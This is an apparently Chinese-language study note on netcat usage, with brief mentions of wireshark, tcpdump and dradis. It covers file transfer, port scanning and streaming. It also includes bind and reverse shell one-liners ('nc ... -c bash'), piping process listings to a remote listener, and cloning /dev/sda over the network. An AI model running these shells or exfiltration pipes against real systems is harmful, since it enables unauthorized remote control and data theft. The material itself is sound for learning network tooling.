nc

nc即 netcat

nc –telnet /banner

nc作为客户端或服务器端使用，作为客户端对服务器端发送指令

作为客户端时 : nc -v 显示详细的连接信息

​ nc -n 如果跟的ip，则不做域名解析(nc最好不做域名解析)

例如，nc -vn xxxxxx port ,切记跟上端口

nc 传送文本信息

实验演示，两台计算机

A: nc -l -p 4444 临时监听TCP端口 -lk永久监听TCP端口

B: nc -nv 1.1.1.1 4444

可以用 命令 netstat -pantu |grep 4444来判断端口是否打开，如果回显 listening则说明已经成功打开

之后，两台电脑就可以进行交互聊天

当作为客户端的电脑执行命令 ls -l | nc -nv xxxx 4444时候，ls -l的回显会在另一台开放端口的计算机上访问

lsof命令 用于查看你进程打开的文件，打开文件的进程，进程打开的端口

当把一个文件重定向到一个文件中呢。我们可以这样

A: nc -l -p3333 >lsof.txt/ps.txt

B: lsof /ps aux|nc -nv xxxx port -q 1（-q 1 的意思是，1秒以后，断开连接）

nc –传送文件或目录

A: nc -lp 333>1.mp4

B: nc -nv 1.1.1.1 333<1.mp4 -q 1

二者二点重定向可以反一下

tar格式（该格式仅仅打包，不压缩）

打包：tar -cvf [目标文件名].tar [原文件名/目录名]
解包：tar -xvf [原文件名].tar

传送目录i的时候

A: tar -cvf -music / | nc-l -p 333 -q 1

B : nc -nv 1.1.1.1 333 |tar-xvf -

nc —流媒体服务

A: cat 1.mp4 | nc -l -p 333

B: nc -nv 1.1.1.1 333 |mplayer -vo x11 -cache 3000-

nc —端口扫描

nc -nvz 1.1.1.1 - 65535

nc -nvzu xxx port(多了个udp)

nc—远程克隆硬盘

A: nc -lp 333 | dd of =/dev/sda

B: dd if = /dev/sda | nc -nv 1.1.1.1 333 -q 1

nc —远程控制

nc再一定程度上代替ssh

正向

A: nc -l -p 333 -c bash

B: nc 1.1.1.1 333

反向

A: nc -l -p 333

B: nc 1.1.1.1 333 -c bash

注意: windows把bash改成cmd

用ssl加密

ncat -c bash –allow xxxx -vnl 333 –ssl

ncat -nv xxxx 333–ssll

wireshark

抓流量包进行分析

可以进行过滤，进行专门的分析

tcpdump

tcpdump -i eth0 -s 0 -w a.cap(，监听 网卡eth0，将结果保存为 a.cap)

tcpdump -r (read)a.cap 摘要信息

tcpdump -a (ascii) a.cap (详细信息)

tcpdump - x (hex) a.cap

tcpdump -i eth0 tcp port 22 抓取22端口的包

dradis

可以远程共享文档

支持插件导入
